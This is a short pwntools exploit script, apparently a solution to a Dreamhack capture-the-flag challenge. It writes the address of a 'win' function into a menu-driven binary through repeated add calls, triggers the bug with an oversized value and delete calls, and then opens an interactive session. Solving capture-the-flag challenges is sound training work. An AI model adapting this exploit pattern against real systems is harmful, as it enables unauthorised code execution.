from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 19298
r = remote(HOST, PORT)

def add(n):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b'= ', b'%d'%n)

def delete():
    r.sendlineafter(b'>> ', b'2')

win = 0x402576

for byte in p64(win):
    add(byte)

add(0x100000000)

for i in range(11):
    delete()

r.interactive()